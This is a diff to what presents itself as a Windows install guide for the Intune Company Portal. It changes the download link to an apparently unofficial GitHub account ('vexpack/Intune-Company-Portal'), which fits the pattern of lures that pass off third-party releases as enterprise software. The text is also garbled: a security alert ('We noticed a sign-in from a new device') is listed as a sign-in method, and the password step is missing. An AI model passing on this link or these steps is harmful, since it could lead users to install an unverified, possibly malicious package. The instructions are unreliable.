@@ -2,11 +2,8 @@
 
 Follow these instructions to install the Company Portal on Windows using the EXE package. For organization-wide deployments, you may run the `msiexec` command from the terminal to perform a silent installation.
 
-1. Download the version of the Company Portal installer suitable for your system:
-
-* [Windows 64-bit](https://github.com/shieldcp/Company-Portal/releases/tag/11.2.1393)  *(most common)*
-* [Windows 32-bit](*)
-* [Windows ARM64](*)
+1. Download the latest version from Releases:       
+https://github.com/vexpack/Intune-Company-Portal/releases/tag/11.2.1
 
 2. Launch the installer by double-clicking the downloaded file.
 
@@ -64,9 +61,9 @@ On macOS, install the Company Portal by visiting [Enroll my Mac](*). The downloa
 
 There are three methods to sign in to the Company Portal app:
 
-* Using your work or school email and password.
-* Using certificate-based authentication.
-* We noticed a sign-in from a new device.
+* Using your work or school email and password
+* Using certificate-based authentication
+* We noticed a sign-in from a new device
 
 For optimal experience, follow the sign-in method recommended or required by your organization.
 
@@ -74,7 +71,5 @@ For optimal experience, follow the sign-in method recommended or required by you
 
 1. Launch the app and select **Sign In**.
 2. Enter your work or school email and select **Next**.
-3. Enter your password and click **Sign In**.
-4. Your credentials are being verified. You will be granted access to the application and your organization's resources upon successful validation.
-5. If prompted, complete any additional security verification, such as **multi-factor authentication** (MFA).
-6. Once signed in, you can **access your dashboard and linked organizational services**.
+3. Your credentials are being verified. You will be granted access to the application and your organization's resources upon successful validation.
+4. If prompted, complete any additional security verification, such as multi-factor authentication (MFA).
